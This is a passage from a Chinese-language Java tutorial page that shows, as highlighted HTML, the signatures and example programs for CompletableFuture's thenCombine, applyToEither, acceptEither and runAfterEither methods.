        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> future1<span class="token punctuation">.</span><span class="token function">thenCombine</span><span class="token punctuation">(</span>future2<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> x<span class="token punctuation">,</span> <span class="token class-name">Integer</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终结果："</span> <span class="token operator">+</span> result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="任务交互">任务交互</h3>
<p>线程交互，是指将两个线程任务获取结果的速度相比较，按一定的规则进行下一步处理。</p>
<h4 id="applyToEither（转换）">applyToEither（转换）</h4>
<p>两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的转换操作。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">applyToEither</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">applyToEitherAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">applyToEitherAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">,</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    future1<span class="token punctuation">.</span><span class="token function">applyToEither</span><span class="token punctuation">(</span>future2<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> number<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最快结果："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="acceptEither（消费）">acceptEither（消费）</h4>
<p>两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的消费操作。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">acceptEither</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">acceptEitherAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">acceptEitherAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">,</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    future1<span class="token punctuation">.</span><span class="token function">acceptEither</span><span class="token punctuation">(</span>future2<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> number<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最快结果："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="runAfterEither">runAfterEither</h4>
<p>两个线程任务相比较，有任何一个执行完成，就进行下一步操作，不关心运行结果。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterEither</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterEitherAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterEitherAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Runnable</span> action<span class="token punctuation">,</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">CompletableFuture</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">Supplier</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> number<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> number<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        future1<span class="token punctuation">.</span><span class="token function">runAfterEither</span><span class="token punctuation">(</span>future2<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
